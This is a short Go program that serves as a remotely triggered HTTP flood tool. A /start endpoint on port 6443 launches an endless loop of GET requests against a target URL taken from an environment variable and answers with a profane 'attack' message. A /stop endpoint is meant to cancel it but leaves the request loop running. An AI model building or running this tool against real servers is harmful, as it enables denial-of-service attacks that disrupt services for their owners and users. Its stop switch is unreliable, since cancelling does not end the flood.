package main

import (
	"context"
	"fmt"
	"os"

	// handle http requests
	"net/http"
)
var (
	ctx context.Context
	cancel context.CancelFunc
)
func SendRequest(url string) error {
	for true {
		_, err := http.Get(url)
		if err != nil {
			return err
		}
	}
	return nil
}
func AttackServer(ctx context.Context, url string) error {
	c := make(chan error, 1)
	go func() {
		c <- SendRequest(url)
	} ()
	select {
	case <- ctx.Done():
		return ctx.Err()
	}
}

func InitiateAttack(w http.ResponseWriter, r *http.Request) {
	ctx, cancel = context.WithCancel(context.Background())
	r.ParseForm()
	go AttackServer(ctx, os.Getenv("URL"))
	fmt.Fprintf(w, "attack mothafucka")
}

func CancelAttack(w http.ResponseWriter, r *http.Request) {
	cancel()
	fmt.Fprintf(w, "canceled")
}
func main () {
	http.HandleFunc("/start", InitiateAttack)
	http.HandleFunc("/stop", CancelAttack)
	fmt.Println("listening on :6443")
	http.ListenAndServe(":6443", nil)

}